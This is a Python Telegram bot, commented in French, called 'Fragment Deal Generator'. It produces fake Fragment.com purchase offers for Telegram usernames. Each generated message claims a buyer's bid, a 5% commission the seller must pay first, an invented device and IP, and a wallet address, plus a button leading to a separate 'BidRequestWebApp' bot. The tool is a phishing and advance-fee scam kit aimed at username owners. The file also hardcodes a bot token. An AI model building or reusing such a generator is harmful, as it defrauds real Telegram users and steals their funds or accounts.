import asyncio
import aiohttp
import sys
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import NetworkError, TimedOut, Conflict

# Configuration simple du logging
import logging
logging.basicConfig(level=logging.ERROR)  # Seulement les erreurs critiques

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
FIXED_CHAT_ID = 511758924
PORT = int(os.getenv('PORT', 10000))  # Port pour Render

print(f"🔍 DEBUG: BOT_TOKEN configuré: ✅")
print(f"🔍 DEBUG: CHAT_ID fixe: {FIXED_CHAT_ID}")
print(f"🔍 DEBUG: PORT: {PORT}")

# Variable globale pour l'application
app_instance = None

# ===== SERVEUR HTTP POUR RENDER =====
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ['/', '/health']:
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Fragment Bot is running!')
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        # Supprime les logs HTTP
        pass

def start_health_server():
    """Démarre le serveur de santé pour Render"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), HealthCheckHandler)
        print(f"🌐 Serveur de santé démarré sur port {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"❌ Erreur serveur de santé: {e}")

# ===== FONCTION PRIX TON =====
async def get_ton_price():
    """Récupère le prix du TON en USD via l'API DIA"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000", 
                timeout=10
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    return float(data.get('Price', 5.50))
                else:
                    print(f"Erreur API DIA: {response.status}")
                    return 5.50
    except Exception as e:
        print(f"Erreur récupération prix TON: {e}")
        return 5.50

# ===== FONCTION GÉNÉRATION MESSAGE =====
async def generate_fragment_message(username, price):
    """Génère le message Fragment avec calculs en temps réel"""
    try:
        # Calculs
        commission = price * 0.05
        ton_to_usd = await get_ton_price()
        price_usd = price * ton_to_usd
        commission_usd = commission * ton_to_usd
        
        # Message personnalisé
        message = f"""We have received a purchase request for your username @{username.upper()} via Fragment.com. Below are the transaction details:

**• Offer Amount: 💎{price:g} TON (${price_usd:.2f} USD)
• Commission: 💎{commission:g} TON (${commission_usd:.2f} USD)**

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)

Important:
**• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message.**"""

        # Bouton vers WebApp
        button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={username}-{price:g}"
        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        return message, reply_markup
        
    except Exception as e:
        print(f"Erreur génération message: {e}")
        return None, None

# ===== GESTIONNAIRE D'ERREURS =====
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire d'erreurs"""
    try:
        error = context.error
        if isinstance(error, Conflict):
            print("❌ Conflit détecté - tentative de résolution...")
            await asyncio.sleep(10)  # Attendre avant de reprendre
        elif isinstance(error, (NetworkError, TimedOut)):
            print(f"⚠️ Erreur réseau: {error}")
        else:
            print(f"Erreur générale: {error}")
    except Exception:
        pass

# ===== COMMANDES TELEGRAM =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start"""
    try:
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        message = f"""🤖 **Fragment Deal Generator**

Bonjour {user.first_name}! 

📱 **Votre Chat ID:** `{chat_id}`

Ce bot génère automatiquement des messages Fragment personnalisés.

**Commandes disponibles:**
• `/create username price` - Créer un message Fragment
• `/help` - Aide

💎 **Prêt à créer vos deals!**"""
        
        await update.message.reply_text(message, parse_mode='Markdown')
        print(f"✅ Commande /start exécutée pour {user.first_name}")
        
    except Exception as e:
        print(f"Erreur start_command: {e}")
        try:
            await update.message.reply_text("❌ Erreur système")
        except:
            pass

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /create username price"""
    try:
        if len(context.args) != 2:
            await update.message.reply_text(
                "❌ **Usage:** `/create username price`\n"
                "📝 **Exemple:** `/create crypto 1000`",
                parse_mode='Markdown'
            )
            return
            
        username = context.args[0].strip().lower()
        try:
            price = float(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Format de prix invalide")
            return
        
        if price <= 0:
            await update.message.reply_text("❌ Le prix doit être supérieur à 0")
            return
            
        # Message de génération
        await update.message.reply_text(
            f"⏳ **Génération du deal...**\n"
            f"👤 Username: @{username}\n"
            f"💰 Prix: {price} TON",
            parse_mode='Markdown'
        )
        
        print(f"🔄 Génération deal @{username} - {price} TON")
        
        # Génération du message
        message, reply_markup = await generate_fragment_message(username, price)
        
        if message and reply_markup:
            await update.message.reply_text(
                message,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            
            await update.message.reply_text(
                f"✅ **Deal créé!**\n"
                f"🎯 @{username} - {price} TON",
                parse_mode='Markdown'
            )
            
            print(f"✅ Deal créé: @{username} - {price} TON")
        else:
            await update.message.reply_text("❌ Erreur génération")
            
    except Exception as e:
        print(f"Erreur create_command: {e}")
        try:
            await update.message.reply_text("❌ Erreur système")
        except:
            pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande d'aide"""
    try:
        help_text = """🤖 **Fragment Deal Generator - Aide**

**Commandes:**
• `/start` - Informations
• `/create username price` - Créer un deal
• `/help` - Cette aide

**Exemple:**
`/create crypto 1500`

💎 **Bot prêt!**"""
        
        await update.message.reply_text(help_text, parse_mode='Markdown')
        print("✅ Help affiché")
        
    except Exception as e:
        print(f"Erreur help: {e}")
        try:
            await update.message.reply_text("❌ Erreur système")
        except:
            pass

# ===== FONCTION DE NETTOYAGE =====
async def cleanup_bot_state():
    """Nettoie l'état du bot pour éviter les conflits"""
    try:
        print("🧹 Nettoyage de l'état du bot...")
        
        # Créer une application temporaire pour nettoyer
        temp_app = Application.builder().token(BOT_TOKEN).build()
        
        try:
            await temp_app.initialize()
            # Récupérer et vider les updates en attente
            await temp_app.bot.get_updates(offset=-1, limit=1, timeout=1)
            print("✅ État nettoyé")
        except Exception as e:
            print(f"Info nettoyage: {e}")
        finally:
            try:
                await temp_app.shutdown()
            except:
                pass
                
        # Attendre un peu
        await asyncio.sleep(5)
        
    except Exception as e:
        print(f"Erreur nettoyage: {e}")

# ===== FONCTION PRINCIPALE BOT =====
async def run_telegram_bot():
    """Lance le bot Telegram de manière robuste"""
    global app_instance
    
    retry_count = 0
    max_retries = 5
    
    while retry_count < max_retries:
        try:
            print(f"🚀 Tentative de démarrage du bot ({retry_count + 1}/{max_retries})...")
            
            # Nettoyage préventif
            if retry_count > 0:
                await cleanup_bot_state()
            
            # Création de l'application
            app_instance = Application.builder().token(BOT_TOKEN).build()
            
            # Ajout des handlers
            app_instance.add_error_handler(error_handler)
            app_instance.add_handler(CommandHandler("start", start_command))
            app_instance.add_handler(CommandHandler("create", create_command))
            app_instance.add_handler(CommandHandler("help", help_command))
            
            print("✅ Bot configuré")
            print(f"💎 Chat ID: {FIXED_CHAT_ID}")
            print("🔗 WebApp: BidRequestWebApp_bot/WebApp")
            print("\n📋 Commandes:")
            print("   • /start - Démarrer")
            print("   • /create username price - Créer deal")
            print("   • /help - Aide")
            
            # Démarrage avec gestion d'erreurs
            print("🔄 Démarrage du polling...")
            await app_instance.run_polling(
                drop_pending_updates=True,
                allowed_updates=['message'],
                close_loop=False
            )
            
            # Si on arrive ici, le bot s'est arrêté normalement
            print("🛑 Bot arrêté normalement")
            break
            
        except Conflict as e:
            retry_count += 1
            print(f"❌ Conflit détecté (tentative {retry_count}): {e}")
            
            if retry_count < max_retries:
                wait_time = min(30, 10 * retry_count)  # Attente progressive
                print(f"⏳ Attente {wait_time}s avant nouvelle tentative...")
                await asyncio.sleep(wait_time)
            else:
                print("❌ Nombre maximum de tentatives atteint")
                break
                
        except Exception as e:
            retry_count += 1
            print(f"❌ Erreur bot (tentative {retry_count}): {e}")
            
            if retry_count < max_retries:
                await asyncio.sleep(10)
            else:
                print("❌ Erreur persistante, arrêt du bot")
                break
                
        finally:
            # Nettoyage de l'instance
            if app_instance:
                try:
                    await app_instance.shutdown()
                except:
                    pass
                app_instance = None

# ===== FONCTION PRINCIPALE =====
def main():
    """Point d'entrée principal"""
    print("🚀 Démarrage Fragment Deal Generator...")
    
    # Serveur de santé pour Render en arrière-plan
    health_thread = Thread(target=start_health_server, daemon=True)
    health_thread.start()
    print("✅ Serveur de santé démarré")
    
    # Configuration de la boucle d'événements
    if sys.platform.startswith('win'):
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    
    try:
        # Lancement du bot Telegram
        asyncio.run(run_telegram_bot())
        
    except KeyboardInterrupt:
        print("\n🛑 Arrêt par utilisateur")
        
    except Exception as e:
        print(f"❌ Erreur critique main: {e}")
        sys.exit(1)
        
    finally:
        print("🔚 Application terminée")

if __name__ == '__main__':
    main()
